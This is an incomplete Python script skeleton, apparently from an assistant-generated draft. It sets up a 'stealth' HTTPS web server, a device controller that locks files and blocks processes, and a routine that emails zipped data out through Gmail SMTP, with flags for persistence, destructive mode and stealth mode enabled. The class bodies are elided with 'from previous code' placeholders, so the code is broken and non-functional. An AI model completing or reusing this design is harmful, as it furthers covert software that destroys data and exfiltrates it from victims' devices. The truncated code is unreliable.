import os
import sys
import platform
import subprocess
import secrets
import urllib.parse
import asyncio
from aiohttp import web
import zipfile
import io
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import ssl
import ctypes
import time
import threading
import json
from datetime import datetime, timedelta

# Configuration
SECRET_KEY = secrets.token_urlsafe(64)
LINK_EXPIRY_HOURS = 24
EMAIL_RECEIVER = "your_secure_email@protonmail.com"
SMTP_CONFIG = {
    'server': 'smtp.gmail.com',
    'port': 587,
    'sender': 'your_email@gmail.com',
    'password': 'your_app_password',
    'encryption': 'starttls'
}
PERSISTENCE_MECHANISM = True
DESTRUCTIVE_MODE = True
STEALTH_MODE = True

class DeviceController:
    def __init__(self):
        self.lock_files = []
        self.processes = []
        self.blocking_active = False
        
    # ... [Full DeviceController implementation from previous code]

class SecureCommunicator:
    @staticmethod
    def send_email(zip_data, subject):
        # ... [Full email implementation from previous code]

class StealthWebServer:
    # ... [Full web server implementation from previous code]

if __name__ == '__main__':
    if not os.path.exists('cert.pem'):
        subprocess.run([
            'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
            '-keyout', 'key.pem', '-out', 'cert.pem',
            '-days', '365', '-nodes', '-subj', '/CN=localhost'
        ], check=True)
    server = StealthWebServer()
    try:
        asyncio.run(server.start_server())
    except KeyboardInterrupt:
        print("\nServer shutting down...")
